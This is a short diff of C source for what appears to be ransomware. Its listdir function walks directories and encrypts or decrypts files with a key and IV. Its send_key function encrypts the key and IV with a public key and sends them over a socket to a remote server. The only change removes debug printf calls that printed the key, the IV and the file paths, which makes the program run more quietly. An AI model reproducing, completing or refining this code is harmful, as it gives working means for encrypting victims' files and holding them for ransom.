@@ -148,8 +148,7 @@ int main (int argc, char * argv[])
             strToken = strtok(NULL, separator);
             strcpy(pIv, strToken);
             size = strlen(pIv);
-            printf("%s\n", key);
-            printf("%s\n", iv);
+           
             pIv[size-1] = '\0';  //removing \n from the iv
             hexa_to_bytes(pKey, key,33);
             hexa_to_bytes(pIv, iv,33);
@@ -158,10 +157,7 @@ int main (int argc, char * argv[])
             strcat(response, " ");
             strcat(response, "Decrypted\n");
 
-            printf("%s\n", key);
-            printf("%s\n", iv);
-            printf("%s\n", pKey);
-            printf("%s\n", pIv);
+           
 
             listdir((const char *)cwd, (unsigned char *)iv, (unsigned char *)key, 'd');
             send(sockid, (const char *)response, strlen(response)+1,0);
@@ -254,7 +250,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
             strcpy(filePath,name);
             strncat(filePath,"/",2);
             strncat(filePath,dirp->d_name,strlen(dirp->d_name));
-            printf("%s\n",filePath);
+            
             if (de_flag == 'e' && is_encrypted(filePath) == 0)
             {
                 encrypt(key, iv, filePath);
@@ -283,7 +279,7 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
     strcpy(msg, pKey);
     strcat(msg,":");
     strcat(msg,pIv);
-    printf("%s\n", msg);
+
     public_encrypt(msg, strlen(msg), publicKey, encrypted);
     send(sockid, (const char *)encrypted, 257,0);
     free(msg);
